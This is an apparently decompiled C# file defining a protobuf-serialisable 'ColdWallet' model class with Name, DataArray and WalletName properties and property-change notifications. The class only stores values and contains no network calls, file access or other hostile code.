using System;
using System.ComponentModel;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models.Common
{
	// Token: 0x02000163 RID: 355
	[ProtoContract(Name = "ColdWallet")]
	public class ColdWallet : INotifyPropertyChanged
	{
		// Token: 0x170002CE RID: 718
		// (get) Token: 0x06000B61 RID: 2913 RVA: 0x00008C97 File Offset: 0x00006E97
		// (set) Token: 0x06000B62 RID: 2914 RVA: 0x00008C9F File Offset: 0x00006E9F
		[ProtoMember(1, Name = "Name")]
		public string Name
		{
			get
			{
				return this._name;
			}
			set
			{
				this._name = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Name"));
			}
		}

		// Token: 0x170002CF RID: 719
		// (get) Token: 0x06000B63 RID: 2915 RVA: 0x00008CC3 File Offset: 0x00006EC3
		// (set) Token: 0x06000B64 RID: 2916 RVA: 0x00008CCB File Offset: 0x00006ECB
		[ProtoMember(2, Name = "DataArray")]
		public byte[] DataArray
		{
			get
			{
				return this._dataArray;
			}
			set
			{
				this._dataArray = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("DataArray"));
			}
		}

		// Token: 0x170002D0 RID: 720
		// (get) Token: 0x06000B65 RID: 2917 RVA: 0x00008CEF File Offset: 0x00006EEF
		// (set) Token: 0x06000B66 RID: 2918 RVA: 0x00008CF7 File Offset: 0x00006EF7
		[ProtoMember(3, Name = "WalletName")]
		public string WalletName
		{
			get
			{
				return this._walletName;
			}
			set
			{
				this._walletName = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("WalletName"));
			}
		}

		// Token: 0x1400001F RID: 31
		// (add) Token: 0x06000B67 RID: 2919 RVA: 0x00022F40 File Offset: 0x00021140
		// (remove) Token: 0x06000B68 RID: 2920 RVA: 0x00022F78 File Offset: 0x00021178
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x0400045E RID: 1118
		private string _name;

		// Token: 0x0400045F RID: 1119
		private string _walletName;

		// Token: 0x04000460 RID: 1120
		private byte[] _dataArray;
	}
}
